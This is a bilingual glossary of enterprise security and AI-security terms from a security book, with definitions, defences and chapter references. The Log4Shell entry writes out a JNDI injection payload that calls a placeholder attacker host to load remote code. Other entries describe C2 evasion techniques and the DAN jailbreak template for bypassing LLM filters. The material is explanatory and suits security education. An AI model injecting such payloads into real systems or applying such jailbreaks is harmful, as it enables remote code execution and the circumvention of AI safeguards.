# 术语表 | Glossary

**[返回主页](../README.md)** | **[开始阅读](../chapters/)** | **[完整目录](./AI-ESA_TOC.md)**

**适用范围**: 《AI-Driven Enterprise Security: Architecture, Methodology, and Practice》全书

本术语表收录书中重要的技术术语、缩写词、框架标准和核心概念，按字母顺序排列，提供中英文对照和简明定义。

---

## A

### AES (Advanced Encryption Standard)

**中文**: 高级加密标准
**定义**: 美国联邦政府采用的对称加密算法标准，支持 128/192/256 位密钥长度。
**应用场景**: 数据加密存储、传输加密、磁盘加密
**相关章节**: Chapter 8 数据安全

### AISecOps (AI-Security-Operations)

**中文**: AI 驱动的安全运营
**定义**: 将人工智能技术融入安全工程全生命周期的方法论与实践体系，涵盖战略规划、架构设计、威胁检测、事件响应到持续优化。
**核心价值**: 自动化检测、智能响应、预测性防御
**相关章节**: Part 5 AI 驱动的安全创新

### API (Application Programming Interface)

**中文**: 应用程序接口
**定义**: 软件组件之间交互的接口规范，定义请求、响应和数据格式。
**安全关注**: API 认证、授权、速率限制、输入验证
**相关章节**: Chapter 6 应用安全架构

### APT (Advanced Persistent Threat)

**中文**: 高级持续性威胁
**定义**: 有组织、有目标、长期潜伏的网络攻击，通常由国家级或专业攻击组织实施。
**特征**: 隐蔽性强、攻击链完整、目标明确
**相关章节**: Chapter 11 安全运营, Chapter 12 红队实践

### ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge)

**中文**: 对手战术技术知识库
**提供方**: MITRE Corporation
**定义**: 攻击技术知识库，涵盖战术、技术、子技术的分类体系。
**应用**: 威胁建模、检测规则开发、红队演练
**相关章节**: Chapter 11 安全运营, Chapter 12 红队实践

### AUC (Area Under the Curve)

**中文**: 曲线下面积
**定义**: 机器学习分类模型的评估指标，ROC-AUC 和 PR-AUC 是两种常用变体。
**ROC-AUC**: 适用于平衡数据集
**PR-AUC**: 适用于不平衡数据集（如欺诈检测）
**相关章节**: Chapter 13 业务安全, Chapter 14 AI for Security

---

## B

### BAS (Breach and Attack Simulation)

**中文**: 入侵与攻击模拟
**定义**: 自动化安全测试平台，持续模拟真实攻击场景以验证防御有效性。
**代表工具**: SafeBreach, AttackIQ, Cymulate
**相关章节**: Chapter 12 红队实践

### bcrypt

**中文**: bcrypt 密码哈希算法
**定义**: 基于 Blowfish 加密算法的慢哈希算法，专为密码存储设计，具有自适应性和抗暴力破解能力。
**输出长度**: 60 字符
**推荐场景**: 密码存储
**相关章节**: Chapter 8 数据安全

### BISO (Business Information Security Officer)

**中文**: 业务信息安全官
**定义**: 嵌入业务部门的安全专家，负责安全与业务融合、风险管理和合规支持。
**核心职责**: 业务风险评估、安全方案设计、事件响应协调
**相关章节**: Chapter 3 业务安全伙伴关系

---

## C

### C2 (Command and Control)

**中文**: 命令与控制
**定义**: 攻击者用于远程控制被入侵系统的通信渠道和服务器。
**隐匿技术**: Domain Fronting, Malleable C2 Profiles, TLS 证书伪装
**相关章节**: Chapter 12 红队实践

### CDN (Content Delivery Network)

**中文**: 内容分发网络
**定义**: 通过全球分布式节点加速内容传输的网络架构。
**安全应用**: DDoS 防护、WAF 集成
**相关章节**: Chapter 5 云安全架构

### CISO (Chief Information Security Officer)

**中文**: 首席信息安全官
**定义**: 企业最高安全负责人，负责制定安全战略、管理安全团队、向董事会报告风险。
**相关章节**: Chapter 16 安全领导力

### CI/CD (Continuous Integration / Continuous Delivery)

**中文**: 持续集成/持续交付
**定义**: 软件开发实践，通过自动化构建、测试、部署提升交付效率。
**安全集成**: SAST, DAST, SCA, 镜像扫描, 签名验证
**相关章节**: Chapter 6 应用安全架构, Chapter 7 供应链安全

### CSPM (Cloud Security Posture Management)

**中文**: 云安全态势管理
**定义**: 持续监控和修复云环境配置错误的安全平台。
**核心功能**: 合规检查、配置漂移检测、权限分析
**相关章节**: Chapter 5 云安全架构

### CVE (Common Vulnerabilities and Exposures)

**中文**: 公共漏洞披露
**定义**: MITRE 维护的公开漏洞编号系统，格式为 CVE-YYYY-NNNNN。
**示例**: CVE-2021-44228 (Log4Shell), CVE-2024-3094 (XZ Utils 后门)
**相关章节**: Chapter 12 红队实践, Chapter 14 AI for Security

---

## D

### DPK (Defects Per KLOC)

**中文**: 千行代码缺陷率
**定义**: 软件质量度量指标，表示每千行代码中的安全缺陷数量。

**计算方式**:

- DPK = 缺陷数 / (代码行数/1000)
- 分级计算时可对不同严重级别赋予权重

**数据来源**: SAST/DAST 扫描结果
**相关章节**: Chapter 6 应用安全架构

---

### Defect Escape Rate (漏测率)

**中文**: 安全缺陷漏测率
**定义**: 生产环境发现的安全缺陷占总缺陷数的百分比，衡量 SDL 流程有效性。

**计算公式**:

```
漏测率 = 生产环境发现的缺陷数 / (SDL发现缺陷数 + 生产环境发现缺陷数) × 100%
```

**数据来源**:

- SDL 发现: SAST/DAST/SCA/代码审查
- 生产发现: 客户报告/渗透测试/漏洞赏金

**相关章节**: Chapter 2 GRC, Chapter 6 应用安全架构

---

### DAN (Do Anything Now)

**中文**: 无限制模式（越狱模板）
**定义**: LLM 越狱攻击模板，通过特定提示词绕过内容过滤策略。
**防御**: System Prompt 强化、元指令检测、输出过滤
**相关章节**: Chapter 15 Security for AI

### DDoS (Distributed Denial of Service)

**中文**: 分布式拒绝服务
**定义**: 通过大量僵尸主机同时发起请求，耗尽目标服务资源导致服务中断。
**防御**: 流量清洗、CDN 防护、速率限制
**相关章节**: Chapter 5 云安全架构, Chapter 11 安全运营

### DevSecOps

**中文**: 开发安全运维一体化
**定义**: 将安全实践嵌入 DevOps 全流程的理念和方法论。
**核心原则**: 左移安全、自动化、持续反馈
**相关章节**: Chapter 5 云安全架构, Chapter 6 应用安全架构

### DLP (Data Loss Prevention)

**中文**: 数据丢失防护
**定义**: 通过内容检测与上下文分析，防止敏感数据未授权外泄的安全技术。
**检测方式**: 关键词匹配、正则表达式、机器学习、指纹识别
**相关章节**: Chapter 8 数据安全, Chapter 10 信息保护

### Domain Fronting

**中文**: 域前置
**定义**: 利用 CDN/云服务隐藏真实 C2 服务器地址的技术，通过 Host header 与 SNI 不匹配实现。
**检测**: TLS 指纹分析、Host/SNI 不匹配检测
**相关章节**: Chapter 12 红队实践

---

## E

### EDR (Endpoint Detection and Response)

**中文**: 端点检测与响应
**定义**: 持续监控和响应端点威胁的安全平台。
**核心能力**: 行为分析、威胁捕获、自动化响应、取证调查
**相关章节**: Chapter 11 安全运营, Chapter 14 AI for Security

### ELK Stack (Elasticsearch, Logstash, Kibana)

**中文**: ELK 日志分析栈
**定义**: 开源日志收集、存储、分析和可视化解决方案。
**安全应用**: SIEM 后端、日志审计、威胁检测
**相关章节**: Chapter 11 安全运营

---

## F

### FPGA (Field-Programmable Gate Array)

**中文**: 现场可编程门阵列
**定义**: 可编程的硬件芯片，用于高性能计算和加密加速。
**安全应用**: 硬件加密、流量解析、DDoS 防护
**相关章节**: Chapter 7 供应链安全

---

## G

### GDPR (General Data Protection Regulation)

**中文**: 通用数据保护条例
**生效时间**: 2018 年 5 月 25 日
**管辖范围**: 欧盟及处理欧盟居民数据的全球组织
**核心原则**: 合法性、透明性、数据最小化、权利保障
**相关章节**: Chapter 9 隐私合规

### GNN (Graph Neural Network)

**中文**: 图神经网络
**定义**: 处理图结构数据的深度学习模型，擅长挖掘实体间关系特征。
**安全应用**: 团伙欺诈检测、恶意软件家族分析、社交网络异常检测
**相关章节**: Chapter 13 业务安全, Chapter 14 AI for Security

### GRC (Governance, Risk, and Compliance)

**中文**: 治理、风险与合规
**定义**: 企业管理框架，整合治理结构、风险管理和合规要求。
**相关章节**: Chapter 2 GRC 治理风险合规

### gVisor

**中文**: gVisor 容器隔离运行时
**开发方**: Google
**定义**: 提供强隔离的容器运行时，通过用户态内核拦截系统调用。
**安全优势**: 减小攻击面、隔离逃逸防护
**相关章节**: Chapter 5 云安全架构

---

## H

### HSM (Hardware Security Module)

**中文**: 硬件安全模块
**定义**: 专用加密硬件，提供密钥生成、存储、加密运算等功能。
**标准**: FIPS 140-2 Level 3/4
**应用场景**: CA 根证书、支付密钥、云 KMS 后端
**相关章节**: Chapter 8 数据安全

---

## I

### IAM (Identity and Access Management)

**中文**: 身份与访问管理
**定义**: 管理用户身份、认证和授权的系统。
**核心组件**: SSO, MFA, RBAC, ABAC, 目录服务
**相关章节**: Chapter 5 云安全架构

### IDS/IPS (Intrusion Detection/Prevention System)

**中文**: 入侵检测/防御系统
**定义**: 监控网络流量以检测（IDS）或阻止（IPS）恶意活动。
**检测方式**: 特征匹配、协议分析、行为异常
**相关章节**: Chapter 4 安全架构与工程

### IoC (Indicator of Compromise)

**中文**: 失陷指标
**定义**: 表明系统可能已被攻陷的证据，如恶意 IP、文件哈希、域名等。
**格式标准**: STIX, OpenIOC
**相关章节**: Chapter 11 安全运营

### ISO/IEC 27001

**中文**: 信息安全管理体系国际标准
**发布方**: 国际标准化组织 (ISO)
**定义**: 建立、实施、维护和持续改进信息安全管理体系的要求标准。
**相关章节**: Chapter 2 GRC 治理风险合规

---

## J

### JA3/JA3S

**中文**: TLS 客户端/服务器指纹
**定义**: 基于 TLS 握手参数生成的哈希指纹，用于识别恶意工具和 C2 通信。
**应用**: C2 检测、恶意软件识别、威胁狩猎
**相关章节**: Chapter 12 红队实践

### JARM

**中文**: TLS 服务器指纹
**定义**: 主动扫描 TLS 服务器生成的指纹，用于识别 C2 框架和恶意基础设施。
**应用**: C2 服务器识别、威胁情报富化
**相关章节**: Chapter 12 红队实践

### JWT (JSON Web Token)

**中文**: JSON Web 令牌
**定义**: 用于身份验证和授权的开放标准（RFC 7519），基于 JSON 的自包含令牌。
**安全风险**: 算法混淆、密钥泄露、弱签名算法
**相关章节**: Chapter 6 应用安全架构

---

## K

### KMS (Key Management Service)

**中文**: 密钥管理服务
**定义**: 集中管理加密密钥生命周期的云服务。
**核心功能**: 密钥生成、轮换、访问控制、审计日志
**相关章节**: Chapter 5 云安全架构, Chapter 8 数据安全

---

## L

### LightGBM (Light Gradient Boosting Machine)

**中文**: 轻量级梯度提升机
**开发方**: Microsoft
**定义**: 基于决策树的梯度提升框架，训练速度快、内存占用低。
**相关章节**: Chapter 13 业务安全

### Log4Shell (CVE-2021-44228)

**中文**: Log4j 远程代码执行漏洞
**发现时间**: 2021 年 12 月
**影响**: Apache Log4j 2.x
**攻击向量**: JNDI 注入 `${jndi:ldap://attacker.com/a}`
**相关章节**: Chapter 7 供应链安全, Chapter 12 红队实践

---

## M

### Malleable C2 Profile

**中文**: 可塑性 C2 配置
**定义**: Cobalt Strike 的 C2 流量定制功能，模拟正常业务流量以规避检测。
**配置内容**: HTTP 请求格式、User-Agent、数据编码方式
**相关章节**: Chapter 12 红队实践

### MFA (Multi-Factor Authentication)

**中文**: 多因素认证
**定义**: 要求两个或多个身份验证因素的安全机制。
**因素类型**: 知识因素（密码）、持有因素（手机）、生物因素（指纹）
**相关章节**: Chapter 5 云安全架构

### MITRE ATT&CK

参见 **ATT&CK**

### ML (Machine Learning)

**中文**: 机器学习
**定义**: 通过数据训练模型以实现预测和决策的人工智能技术。
**安全应用**: 威胁检测、欺诈识别、异常行为分析
**相关章节**: Part 5 AI 驱动的安全创新

### MLSecOps

**中文**: 机器学习模型的安全运营
**定义**: 将安全实践集成到 ML 模型生命周期的方法论。
**覆盖范围**: 数据安全、模型训练、推理服务、监控审计
**相关章节**: Chapter 15 Security for AI

### MTTD (Mean Time To Detect)

**中文**: 平均检测时间
**定义**: 从攻击发生到触发告警的平均时间。
**计算公式**: 告警触发时间 - 攻击发生时间
**相关章节**: Chapter 11 安全运营, Chapter 16 安全领导力

### MTTA (Mean Time To Acknowledge)

**中文**: 平均确认时间
**定义**: 从告警触发到分析师确认响应的平均时间。
**计算公式**: 分析师确认时间 - 告警触发时间
**相关章节**: Chapter 11 安全运营

### MTTR (Mean Time To Respond/Recover)

**中文**: 平均响应/恢复时间
**定义**: 从开始响应到威胁遏制（Respond）或系统恢复（Recover）的平均时间。

**适用场景**:

- **漏洞响应 MTTR**: 适用于应用安全，按漏洞严重级别设定 SLA
- **事件响应 MTTR**: 适用于 SOC，按事件优先级设定 SLA

**计算公式**:

```
MTTR = Σ(修复时间) / 漏洞或事件总数
修复时间 = 修复完成时间戳 - 发现时间戳
```

**数据来源**: JIRA/ServiceNow 工单时间戳
**相关章节**: Chapter 6 应用安全架构, Chapter 11 安全运营, Chapter 16 安全领导力

---

## N

### NIST (National Institute of Standards and Technology)

**中文**: 美国国家标准与技术研究院
**定义**: 美国联邦政府的技术创新机构，发布网络安全框架和标准。
**核心标准**:

- NIST CSF (Cybersecurity Framework)
- NIST SP 800-53 (安全控制)
- NIST SP 800-61 Rev. 2 (事件响应)
  **相关章节**: Chapter 2 GRC 治理风险合规, Chapter 11 安全运营

---

## O

### OAuth 2.0

**中文**: 开放授权 2.0
**定义**: 授权框架标准（RFC 6749），允许第三方应用访问用户资源而无需暴露密码。
**安全增强**: PKCE (Proof Key for Code Exchange)
**相关章节**: Chapter 6 应用安全架构

### OWASP (Open Web Application Security Project)

**中文**: 开放式 Web 应用程序安全项目
**定义**: 全球非营利安全社区，发布安全标准和实践指南。
**核心项目**:

- OWASP Top 10 (Web 应用风险)
- OWASP LLM Top 10 (LLM 风险)
- OWASP SAMM (软件成熟度模型)
  **相关章节**: Chapter 6 应用安全架构, Chapter 15 Security for AI

---

## P

### PAM (Privileged Access Management)

**中文**: 特权访问管理
**定义**: 管理和监控特权账号（root、admin 等）访问的安全系统。
**核心功能**: 密码金库、会话录制、Just-In-Time 访问
**相关章节**: Chapter 5 云安全架构, Chapter 12 红队实践

### PKCE (Proof Key for Code Exchange)

**中文**: 代码交换证明密钥
**定义**: OAuth 2.0 的安全扩展（RFC 7636），防止授权码拦截攻击。
**应用场景**: 移动应用、单页应用 (SPA)
**相关章节**: Chapter 6 应用安全架构

### PR-AUC (Precision-Recall AUC)

**中文**: 精确率-召回率曲线下面积
**定义**: 不平衡数据集的评估指标，聚焦于正样本（少数类）的检测能力。
**适用场景**: 欺诈检测、入侵检测等正负样本比例悬殊的场景
**相关章节**: Chapter 13 业务安全

---

## R

### RBAC (Role-Based Access Control)

**中文**: 基于角色的访问控制
**定义**: 根据用户角色授予权限的访问控制模型。
**核心概念**: 用户-角色-权限三层映射
**相关章节**: Chapter 5 云安全架构, Chapter 8 数据安全

### RCE (Remote Code Execution)

**中文**: 远程代码执行
**定义**: 攻击者可以在目标系统上执行任意代码的漏洞类型。
**危害等级**: 严重（Critical）
**典型案例**: Log4Shell, EternalBlue
**相关章节**: Chapter 12 红队实践

### ROC-AUC (Receiver Operating Characteristic AUC)

**中文**: 受试者工作特征曲线下面积
**定义**: 衡量二分类模型的综合性能指标。
**适用场景**: 平衡数据集
**局限性**: 不平衡数据集易虚高
**相关章节**: Chapter 13 业务安全

---

## S

### SABSA (Sherwood Applied Business Security Architecture)

**中文**: SABSA 业务安全架构
**定义**: 面向业务的安全架构框架，提供从战略到实施的方法论。
**层次模型**: 情境层、概念层、逻辑层、物理层、组件层、运营层
**相关章节**: Chapter 1 企业架构基础

### SAML (Security Assertion Markup Language)

**中文**: 安全断言标记语言
**定义**: XML 标准，用于身份提供商 (IdP) 和服务提供商 (SP) 之间交换认证和授权数据。
**应用场景**: 企业 SSO、联邦身份认证
**相关章节**: Chapter 5 云安全架构

### SAST (Static Application Security Testing)

**中文**: 静态应用安全测试
**定义**: 不运行程序，通过分析源代码或字节码发现安全缺陷。
**检测漏洞**: SQL 注入、XSS、硬编码密钥、不安全配置
**相关章节**: Chapter 6 应用安全架构

### SBOM (Software Bill of Materials)

**中文**: 软件物料清单
**定义**: 软件组件及其依赖关系的正式清单，类似于制造业的物料清单。
**格式标准**: SPDX, CycloneDX
**应用**: 供应链安全、漏洞管理、许可证合规
**相关章节**: Chapter 7 供应链安全

### SCA (Software Composition Analysis)

**中文**: 软件成分分析
**定义**: 识别开源组件及其已知漏洞的工具。
**检测内容**: CVE 漏洞、许可证风险、过时版本
**相关章节**: Chapter 6 应用安全架构, Chapter 7 供应链安全

---

### SDL (Security Development Lifecycle)

**中文**: 安全开发生命周期
**定义**: 微软提出的将安全实践系统性集成到软件开发全流程的方法论。

**核心阶段**:

1. 威胁建模 (Threat Modeling)
2. 安全需求 (Security Requirements)
3. 安全设计 (Secure Design)
4. 安全编码 (Secure Coding)
5. 安全测试 (Security Testing)
6. 安全发布 (Secure Release)
7. 安全监控 (Security Monitoring)

**相关章节**: Chapter 6 应用安全架构

---

### SLSA (Supply-chain Levels for Software Artifacts)

**中文**: 软件制品供应链等级
**定义**: Google 等公司发起的供应链安全框架，定义构建完整性的成熟度等级。

**等级划分**:

- **Level 1**: 构建过程文档化
- **Level 2**: 防篡改构建服务
- **Level 3**: 审计化构建平台
- **Level 4**: Hermetic 构建（可重现构建）

**相关章节**: Chapter 7 供应链安全

### SIEM (Security Information and Event Management)

**中文**: 安全信息与事件管理
**定义**: 集中收集、分析和关联安全事件的平台。
**核心功能**: 日志聚合、实时分析、告警管理、合规报告
**相关章节**: Chapter 11 安全运营

### SMOTE (Synthetic Minority Over-sampling Technique)

**中文**: 合成少数类过采样技术
**定义**: 通过在少数类样本间插值生成合成样本，解决类别不平衡问题。
**适用场景**: 欺诈检测等正负样本比例极端不平衡的场景
**相关章节**: Chapter 13 业务安全

### SNI (Server Name Indication)

**中文**: 服务器名称指示
**定义**: TLS 扩展，允许客户端在握手时指定目标主机名。
**安全应用**: Domain Fronting 检测（SNI 与 Host header 不匹配）
**相关章节**: Chapter 12 红队实践

### SOAR (Security Orchestration, Automation and Response)

**中文**: 安全编排自动化与响应
**定义**: 自动化安全运营流程的平台，通过 Playbook 编排多个安全工具。
**核心价值**: 提升响应速度、减少人工成本、标准化流程
**相关章节**: Chapter 11 安全运营

### SOC (Security Operations Center)

**中文**: 安全运营中心
**定义**: 7×24 小时监控和响应安全事件的组织和设施。
**核心职能**: 威胁监控、事件响应、威胁情报、漏洞管理
**相关章节**: Chapter 11 安全运营

### SQL Injection

**中文**: SQL 注入
**定义**: 通过在输入中注入恶意 SQL 代码，操纵数据库查询的攻击。
**防御**: 参数化查询、ORM 框架、输入验证、最小权限
**相关章节**: Chapter 6 应用安全架构

---

### STRIDE

**中文**: STRIDE 威胁建模方法
**定义**: 微软开发的威胁分类框架，按 6 种威胁类型系统性识别安全风险。

**威胁类型**:

- **Spoofing (假冒身份)**: 攻击者冒充合法用户/系统
- **Tampering (篡改数据)**: 未授权修改数据或代码
- **Repudiation (否认行为)**: 用户否认执行过的操作
- **Information Disclosure (信息泄露)**: 敏感信息未授权访问
- **Denial of Service (拒绝服务)**: 消耗资源导致服务不可用
- **Elevation of Privilege (提权)**: 获得超出授权的权限

**威胁建模流程**:

1. 绘制数据流图 (DFD)
2. 识别信任边界
3. 对每个边界应用 STRIDE
4. 评估风险并制定缓解措施
5. 验证缓解有效性

**相关章节**: Chapter 4 安全架构与工程, Chapter 6 应用安全架构

### SSO (Single Sign-On)

**中文**: 单点登录
**定义**: 用户一次认证后即可访问多个系统的身份验证方案。
**协议**: SAML, OAuth 2.0, OpenID Connect
**相关章节**: Chapter 5 云安全架构

---

## T

### TLS (Transport Layer Security)

**中文**: 传输层安全协议
**定义**: 加密通信协议，保护网络传输数据的机密性和完整性。
**当前版本**: TLS 1.3（2018 年发布）
**安全特性**: 前向保密、0-RTT、加密 SNI
**相关章节**: Chapter 4 安全架构与工程

### TOGAF (The Open Group Architecture Framework)

**中文**: 开放组织架构框架
**定义**: 企业架构设计和实施的方法论框架。
**ADM**: Architecture Development Method（架构开发方法）
**相关章节**: Chapter 1 企业架构基础

### TTP (Tactics, Techniques, and Procedures)

**中文**: 战术、技术与程序
**定义**: 攻击者的行为模式和操作方法的标准化描述。
**框架**: MITRE ATT&CK 矩阵
**相关章节**: Chapter 11 安全运营, Chapter 12 红队实践

---

## U

### UEBA (User and Entity Behavior Analytics)

**中文**: 用户与实体行为分析
**定义**: 通过机器学习建立行为基线，检测异常行为的安全技术。
**检测场景**: 内部威胁、账号劫持、权限滥用
**相关章节**: Chapter 11 安全运营, Chapter 14 AI for Security

---

## V

### VPN (Virtual Private Network)

**中文**: 虚拟专用网络
**定义**: 在公共网络上建立加密隧道的技术。
**安全风险**: VPN 服务器漏洞、弱加密算法、日志泄露
**相关章节**: Chapter 4 安全架构与工程

---

## W

### WAF (Web Application Firewall)

**中文**: Web 应用防火墙
**定义**: 保护 Web 应用免受 OWASP Top 10 攻击的安全设备。
**检测方式**: 特征匹配、协议分析、机器学习
**部署模式**: 反向代理、透明代理、云 WAF
**相关章节**: Chapter 6 应用安全架构

---

## X

### XGBoost (eXtreme Gradient Boosting)

**中文**: 极端梯度提升
**定义**: 基于决策树的梯度提升库，训练速度快、准确率高。
**优势**: 内置正则化、并行处理、缺失值处理、类别不平衡处理
**安全应用**: 欺诈检测、恶意软件分类、威胁评分
**相关章节**: Chapter 13 业务安全, Chapter 14 AI for Security

### XSS (Cross-Site Scripting)

**中文**: 跨站脚本攻击
**定义**: 在目标网站注入恶意脚本，在其他用户浏览器中执行。
**类型**: 存储型 XSS、反射型 XSS、DOM 型 XSS
**防御**: 输出编码、CSP 策略、HTTPOnly Cookie
**相关章节**: Chapter 6 应用安全架构

### XZ Utils Backdoor (CVE-2024-3094)

**中文**: XZ Utils 后门漏洞
**发现时间**: 2024 年 3 月
**定义**: 供应链攻击案例，恶意代码被植入开源压缩库 liblzma。
**影响**: Linux 发行版（Debian, Ubuntu, Fedora 等）
**检测**: 验证 liblzma.so 签名和构建来源
**相关章节**: Chapter 7 供应链安全, Chapter 12 红队实践

---

## Z

### Zero Trust

**中文**: 零信任
**定义**: "永不信任，始终验证"的安全架构理念，不基于网络位置授予信任。
**核心原则**:

- 验证每个访问请求
- 最小权限访问
- 假设 breach（假定违规）
- 微分段
  **相关章节**: Chapter 1 企业架构基础, Chapter 4 安全架构与工程

---

## 中文术语索引

| 中文术语             | 英文缩写            |
| -------------------- | ------------------- |
| 安全运营中心         | SOC                 |
| 平均检测时间         | MTTD                |
| 平均响应时间         | MTTR                |
| 数据丢失防护         | DLP                 |
| 端点检测与响应       | EDR                 |
| 安全信息与事件管理   | SIEM                |
| 安全编排自动化与响应 | SOAR                |
| 业务信息安全官       | BISO                |
| 首席信息安全官       | CISO                |
| 零信任               | Zero Trust          |
| 多因素认证           | MFA                 |
| 单点登录             | SSO                 |
| 威胁情报             | Threat Intelligence |
| 事件响应             | Incident Response   |
| 红队                 | Red Team            |
| 蓝队                 | Blue Team           |
| 紫队                 | Purple Team         |
| 渗透测试             | Penetration Testing |

---

## 参考标准与框架

| 标准/框架    | 全称                                                | 发布方  | 适用领域     |
| ------------ | --------------------------------------------------- | ------- | ------------ |
| NIST CSF     | Cybersecurity Framework                             | NIST    | 网络安全框架 |
| ISO 27001    | Information Security Management                     | ISO     | 信息安全管理 |
| SOC 2        | Service Organization Control 2                      | AICPA   | 服务组织审计 |
| GDPR         | General Data Protection Regulation                  | 欧盟    | 数据保护     |
| PCI DSS      | Payment Card Industry Data Security Standard        | PCI SSC | 支付卡安全   |
| HIPAA        | Health Insurance Portability and Accountability Act | 美国    | 医疗信息保护 |
| CIS Controls | Center for Internet Security Controls               | CIS     | 安全基线     |
| MITRE ATT&CK | Adversarial Tactics, Techniques & Common Knowledge  | MITRE   | 攻击技术库   |
| OWASP Top 10 | Open Web Application Security Project Top 10        | OWASP   | Web 安全风险 |

---

**维护说明**: 本术语表随书稿更新。如发现术语遗漏或定义不准确，请通过 GitHub 提交 Issue。

---

**© 2025 AI-ESA Project. Licensed under CC BY-NC-SA 4.0**
